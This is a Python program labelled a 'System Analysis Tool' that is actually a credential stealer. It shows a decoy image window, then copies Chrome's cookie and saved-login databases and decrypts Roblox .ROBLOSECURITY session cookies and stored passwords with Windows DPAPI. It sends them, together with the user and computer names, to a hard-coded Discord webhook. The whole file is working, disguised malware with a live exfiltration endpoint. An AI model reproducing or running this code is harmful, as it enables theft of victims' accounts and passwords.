import os
import json
import base64
import sqlite3
import shutil
import tempfile
import requests
import threading
import webbrowser
from datetime import datetime
from Crypto.Cipher import AES
import win32crypt
from PIL import Image, ImageTk
import tkinter as tk

# Configuration
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1413174338085191721/jWjTrhSDZmdx2KzXb1RD9hMR0RjSMkPXVyVxXOsCPKCuWR4A1ET1jrjpX40yIYz2vbCl"
IMGUR_DISPLAY = "https://i.imgur.com/B5uw1ts.jpeg"

class SystemAnalyzer:
    def __init__(self):
        self.session_id = base64.b85encode(os.urandom(16)).decode()
        self.root = None
        
    def show_image(self):
        """Display image from Imgur"""
        try:
            self.root = tk.Tk()
            self.root.title("System Analysis Tool")
            self.root.geometry("800x600")
            
            # Download and display image
            response = requests.get(IMGUR_DISPLAY, timeout=10)
            if response.status_code == 200:
                with open("temp_image.jpg", "wb") as f:
                    f.write(response.content)
                
                img = Image.open("temp_image.jpg")
                img = img.resize((600, 400), Image.LANCZOS)
                photo = ImageTk.PhotoImage(img)
                
                label = tk.Label(self.root, image=photo)
                label.image = photo
                label.pack(pady=20)
                
            status_label = tk.Label(self.root, text="System analysis in progress...", font=("Arial", 12))
            status_label.pack(pady=10)
            
            self.root.after(3000, self.start_analysis)
            self.root.mainloop()
            
        except Exception as e:
            print(f"Image display error: {e}")
            self.start_analysis()

    def decrypt_value(self, encrypted_value):
        """Decrypt Chrome values using Windows DPAPI"""
        try:
            return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()
        except Exception:
            return "[ENCRYPTED]"

    def find_chrome_file(self, filename):
        """Find Chrome file in user profile"""
        base_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data')
        
        # Check Default directory first
        default_path = os.path.join(base_path, 'Default', filename)
        if os.path.exists(default_path):
            return default_path
        
        # Search in other profiles
        for item in os.listdir(base_path):
            if item.startswith('Profile'):
                profile_path = os.path.join(base_path, item, filename)
                if os.path.exists(profile_path):
                    return profile_path
        
        return None

    def extract_chrome_cookies(self):
        """Extract Chrome cookies via SQLite"""
        found_cookies = []
        try:
            cookies_path = self.find_chrome_file('Cookies')
            
            if not cookies_path:
                return [{'error': 'Cookies file not found'}]
            
            temp_dir = tempfile.gettempdir()
            temp_db = os.path.join(temp_dir, 'cookies_temp')
            shutil.copy2(cookies_path, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            cursor.execute("""
                SELECT host_key, name, value, encrypted_value, path, expires_utc
                FROM cookies 
                WHERE host_key LIKE '%roblox%' OR name LIKE '%ROBLOSECURITY%'
            """)
            
            for host, name, value, encrypted_value, path, expires in cursor.fetchall():
                final_value = value
                if not value and encrypted_value:
                    final_value = self.decrypt_value(encrypted_value)
                
                cookie_info = {
                    'host': host,
                    'name': name,
                    'value': final_value,
                    'path': path,
                    'expires': expires
                }
                found_cookies.append(cookie_info)
            
            conn.close()
            os.remove(temp_db)
                
        except Exception as e:
            found_cookies.append({'error': str(e)})
        
        return found_cookies

    def extract_chrome_passwords(self):
        """Extract saved Chrome passwords"""
        found_passwords = []
        try:
            logins_path = self.find_chrome_file('Login Data')
            
            if not logins_path:
                return [{'error': 'Login data file not found'}]
            
            temp_logins = os.path.join(tempfile.gettempdir(), 'logins_temp')
            shutil.copy2(logins_path, temp_logins)
            
            conn = sqlite3.connect(temp_logins)
            cursor = conn.cursor()
            
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            
            for url, username, encrypted_password in cursor.fetchall()[:5]:
                decrypted_password = ""
                if encrypted_password:
                    decrypted_password = self.decrypt_value(encrypted_password)
                
                found_passwords.append({
                    'url': url,
                    'username': username,
                    'password': decrypted_password
                })
            
            conn.close()
            os.remove(temp_logins)
                
        except Exception as e:
            found_passwords.append({'error': str(e)})
        
        return found_passwords

    def send_to_webhook(self, data):
        """Send data to webhook"""
        try:
            response = requests.post(
                DISCORD_WEBHOOK,
                json=data,
                timeout=15
            )
            return response.status_code == 200
        except Exception as e:
            print(f"Webhook error: {e}")
            return False

    def perform_analysis(self):
        """Perform system analysis"""
        print("Starting system analysis...")
        
        collected_data = {
            'chrome_cookies': self.extract_chrome_cookies(),
            'chrome_passwords': self.extract_chrome_passwords(),
            'system_info': {
                'user': os.getenv('USERNAME'),
                'computer': os.getenv('COMPUTERNAME'),
                'session': self.session_id
            },
            'timestamp': datetime.now().isoformat()
        }
        
        # Display results
        print(f"Cookies found: {len(collected_data['chrome_cookies'])}")
        print(f"Passwords found: {len(collected_data['chrome_passwords'])}")
        
        print("\nROBLOSECURITY Cookies:")
        for cookie in collected_data['chrome_cookies']:
            if 'ROBLOSECURITY' in cookie.get('name', ''):
                print(f"   {cookie['name']}: {cookie['value'][:60]}...")
        
        print("\nSample credentials:")
        if collected_data['chrome_passwords'] and not collected_data['chrome_passwords'][0].get('error'):
            sample = collected_data['chrome_passwords'][0]
            print(f"   Site: {sample.get('url', 'N/A')}")
            print(f"   Username: {sample.get('username', 'N/A')}")
            print(f"   Password: {sample.get('password', 'N/A')}")
        
        print(f"\nSending to webhook...")
        send_status = self.send_to_webhook(collected_data)
        print(f"   Webhook status: {'Success' if send_status else 'Failed'}")
        
        return collected_data

    def start_analysis(self):
        """Start analysis process"""
        if self.root:
            self.root.destroy()
        
        # Run analysis in background thread
        analysis_thread = threading.Thread(target=self.perform_analysis)
        analysis_thread.daemon = True
        analysis_thread.start()

def main():
    print("=" * 60)
    print("System Analysis Tool")
    print("Initializing components...")
    print("=" * 60)
    
    # Check and install dependencies if needed
    try:
        import win32crypt
    except ImportError:
        print("Installing required components...")
        os.system("pip install pywin32")
    
    try:
        import requests
    except ImportError:
        print("Installing network components...")
        os.system("pip install requests")
    
    try:
        from PIL import Image
    except ImportError:
        print("Installing imaging components...")
        os.system("pip install pillow")
    
    analyzer = SystemAnalyzer()
    analyzer.show_image()

if __name__ == "__main__":
    main()
